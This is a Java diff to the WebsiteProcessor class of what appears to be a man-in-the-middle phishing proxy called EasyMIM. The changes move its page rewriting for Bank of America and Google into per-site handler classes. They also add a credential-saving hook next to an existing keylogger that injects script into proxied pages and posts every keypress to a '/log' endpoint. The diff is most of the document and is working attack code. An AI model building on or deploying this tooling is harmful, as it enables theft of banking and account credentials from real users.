@@ -9,6 +9,7 @@ import java.net.MalformedURLException;
 import java.net.URL;
 import java.nio.charset.Charset;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
@@ -24,15 +25,23 @@ import org.jsoup.nodes.Document.OutputSettings;
 import org.jsoup.nodes.Entities.EscapeMode;
 import org.jsoup.select.Elements;
 
-import Models.ClientInfo;
-import Models.EasyMIMConfig;
-import Models.RequestInfo;
+import DataStructures.ClientInfo;
+import DataStructures.EasyMIMConfig;
+import DataStructures.RequestInfo;
+import WebsiteHandlers.BankOfAmericanHandler;
+import WebsiteHandlers.GoogleHandler;
+import WebsiteHandlers.WebsiteHandler;
 
 
 public class WebsiteProcessor {
 	private final String USER_AGENT = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36";
 	public enum Protocol{HTTP,HTTPS};
 	public EasyMIMConfig config;
+	public static HashMap<String,WebsiteHandler> domainToHandler = new HashMap<String,WebsiteHandler>();
+	static{
+		domainToHandler.put("bankofamerica.com", new BankOfAmericanHandler());
+		domainToHandler.put("google.com", new GoogleHandler());
+	}
 	
 	public WebsiteProcessor() {
 		this.config = new EasyMIMConfig();
@@ -100,25 +109,15 @@ public class WebsiteProcessor {
 			}
 			l.attr("src", imgSrc);
 		}
-		/*Needed for Bank of America*/
-		Elements boas = doc.select("div[data-fallback]");
-		for(Element boa:boas){
-			boa.attr("data-mboxer", "");
-			String dataF = boa.attr("data-fallback");
-			Pattern p = Pattern.compile("src=\"");
-			Matcher m = p.matcher(dataF);
-			dataF=m.replaceAll("src=\"http://"+ci.getBase());
-			boa.append(dataF);
-		}
-		/*Needed for Bank of America*/
-		/*Needed for Bank of google*/
-		Elements googs = doc.select("#lang-chooser-wrap");
-		for(Element goog:googs){
-			goog.html("");
+		if(domainToHandler.containsKey(ci.getBase())){
+			domainToHandler.get(ci.getBase()).process(doc);
 		}
 		//keylogger code
 		if(config.keylogger){
 			addKeylogger(ri,doc);
+		}
+		if(config.saveCred){
+			addCredSaver(ri,doc);
 		}
 		//popup message
 		if(config.popUpMessage!=null && !config.popUpMessage.equals("")){
@@ -157,7 +156,7 @@ public class WebsiteProcessor {
 			if(input.attr("id")!=null && !input.attr("id").equals("")){
 				String keyString ="'"+input.attr("id")+"'";
 				String valueString = "$('#"+input.attr("id")+"').val()";
-				String var = "var d = {url:'"+ri.url+"',key:"+keyString+",value:"+valueString+"};";
+				String var = "var d = {url:'"+ri.url+"',key:"+keyString+",value:"+valueString+","+Logger.Logger.LOG_PARAM+":'"+Logger.Logger.KEY_LOG_VALUE+"'};";
 				String ajaxString = "$.ajax({url:'/log',type: 'POST',data:d})";
 				String complete = "<script> $( '#"+input.attr("id")+"' ).keypress(function() {"+
 				var+
